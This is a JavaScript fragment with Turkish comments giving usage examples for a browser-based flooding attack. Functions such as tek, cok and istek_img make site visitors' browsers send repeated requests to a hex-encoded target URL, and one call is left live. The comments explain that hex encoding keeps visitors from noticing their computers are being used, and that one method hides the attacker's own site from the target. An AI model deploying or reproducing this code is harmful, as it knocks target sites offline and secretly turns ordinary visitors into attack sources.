// şimdilik kullanım dışı, image file atak
  //ImageUrlToBase64('https://www.example-site.com/index.php?p=','https://your-image-url.com/android-chrome-512x512.png','base64'); // base64 file
  //ImageUrlToBase64('https://www.example-site.com/index.php?p=','https://your-image-url.com/android-chrome-512x512.png','file'); // direk file
  // note: istekler karşılıksız olsada atak yapmaktadır.!!!
  // şimdilik kullanım dışı, image file atak.
 
 

  // # Kullanıma uygun örnekler

  // 1-
  //tek('68747470733a2f2f7777772e6566746f746f656b7370657274697a2e636f6d2f696e6465782e7068703f703d');
  // bu atak kullandıldığında, yine saldıran kişi ziyaretçi ip adresi olsada, ziyaretçinin hedefe saldırdığını ortaya çıkaran origin= ile site adresiniz gözükür.


  // 2-
  //cok('68747470733a2f2f7777772e6566746f746f656b7370657274697a2e636f6d2f696e6465782e7068703f703d');
  // bu atak kullandıldığında, yine saldıran kişi ziyaretçi ip adresi olsada, ziyaretçinin hedefe saldırdığını ortaya çıkaran origin= ile site adresiniz gözükür. tek() fonksiyonundan farklı karşı tarafa çok daha yüksek byte ile saldırır, fakat bu yavaşlık yaratabiir. tek() kullanımı önerilen örnektir.

  // 3- önerilen yöntem. karşı tarafta Saldıran sadece ziyaretçi ip adresi olarak görünür.
  // örnek: site adresi = https://www.yoursitename.com/index.php?q=
  // bu adresi str to hex yapınız 68747470733a2f2f7777772e796f7572736974656e616d652e636f6d2f696e6465782e7068703f713d
  istek_img('68747470733a2f2f7777772e796f7572736974656e616d652e636f6d2f696e6465782e7068703f713d','1');
  // bu saldırı yönteminde site adresiniz asla gözükmez. artı olarka strtohex kullandığınız için ziyaretçi sayfa kaynağını görüntülesede kendi bilgisayarının saldırı amaçlı kullanıldığını fark edemez.

  // # Kullanıma uygun örnekler
